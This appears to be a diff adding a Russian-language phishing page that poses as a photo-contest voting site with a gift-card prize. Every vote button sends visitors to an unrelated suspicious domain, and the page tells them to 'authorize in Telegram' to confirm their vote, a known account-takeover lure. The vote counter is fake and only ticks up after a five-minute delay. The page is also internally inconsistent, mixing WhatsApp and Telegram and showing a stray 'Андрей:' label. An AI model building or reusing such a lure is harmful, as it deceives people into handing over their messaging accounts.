@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            background-color: #f0f2f5;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #333;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+        .instructions {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #555;
+        }
+        .whatsapp-icon {
+            vertical-align: middle;
+            margin-left: 10px;
+        }
+        .contestant {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #fafafa;
+            margin-bottom: 30px;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
+        }
+        .contestant-info {
+            text-align: left;
+            flex: 1;
+        }
+        .contestant-info .name {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        .vote-count {
+            font-size: 16px;
+            color: #888;
+            margin-bottom: 15px;
+        }
+        .vote-button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #ff5e57;
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            transition: background-color 0.3s;
+            box-shadow: 0 4px 10px rgba(255, 94, 87, 0.2);
+        }
+        .vote-button:hover {
+            background-color: #e04b47;
+        }
+        .vote-button:active {
+            background-color: #c94641;
+        }
+        .contestant img {
+            width: 150px;
+            height: auto;
+            border-radius: 10px;
+            transition: transform 0.3s;
+            margin-left: 20px;
+        }
+        .contestant img:hover {
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Голосуй за своего фаворита!</h1>
+    <p>Помоги выбрать победителя в фото конкурсе. Приз — подарочная карта 10.000 рублей.</p>
+
+    <!-- Инструкция для голосования через WhatsApp -->
+    <div class="instructions">
+        Для подтверждения вашего голоса жмите голосовать и пройдите авторизацию в Telegram 
+        <img class="whatsapp-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/768px-Telegram_logo.svg.png" alt="WhatsApp" width="24" height="24">
+    </div>
+    <div class="contestant">
+        <div class="contestant-info">
+            <div class="name">Юлия</div>
+            <div class="vote-count">Андрей: <span id="votes-1">58</span></div>
+            <a class="vote-button" href="https://repoiuysdnhygdd.cyou/lend" onclick="vote(1)">Голосовать за Юлию</a>
+        </div>
+        <img src="https://sun9-41.userapi.com/s/v1/ig2/Cvm8fm_YF9F_2i5z45uZQgIZMpSr9fMA09LOuoLDmG02u5dHnYFmTXicjS8yBI6ZUuLhpt915r7JHDQYn84dbN9W.jpg?quality=95&crop=1,199,1919,1919&as=32x32,48x48,72x72,108x108,160x160,240x240,360x360,480x480,540x540,640x640,720x720,1080x1080,1280x1280,1440x1440&ava=1&u=AUlNf4_r9IE6CqvtmKh3f00YP60yon-TUKLkDztcO3Q&cs=200x200" alt="Участница 2">
+    </div>
+    <!-- Вторая участница -->
+    <div class="contestant">
+        <div class="contestant-info">
+            <div class="name">Алёна</div>
+            <div class="vote-count">Голосов: <span id="votes-2">65</span></div>
+            <a class="vote-button" href="https://repoiuysdnhygdd.cyou/lend" onclick="vote(2)">Голосовать за Алёну</a>
+        </div>
+        <img src="https://sun6-21.userapi.com/impf/c638222/v638222078/1b66d/orMov2F_5q0.jpg?size=2048x1536&quality=96&sign=1cae3159dc0f870c2d0dac2a25a73a87&type=album" alt="Участница 2">
+    </div>
+</div>
+
+<script>
+    // Переменные для хранения количества голосов
+    let votes1 = 22;
+    let votes2 = 17;
+
+    // Функция для голосования с задержкой 5 минут (300000 миллисекунд)
+    function vote(contestantId) {
+        setTimeout(() => {
+            if (contestantId === 1) {
+                votes1++;
+                document.getElementById('votes-1').textContent = votes1;
+            } else if (contestantId === 2) {
+                votes2++;
+                document.getElementById('votes-2').textContent = votes2;
+            }
+        }, 300000); // Задержка 5 минут
+    }
+</script>
+
+</body>
+</html>
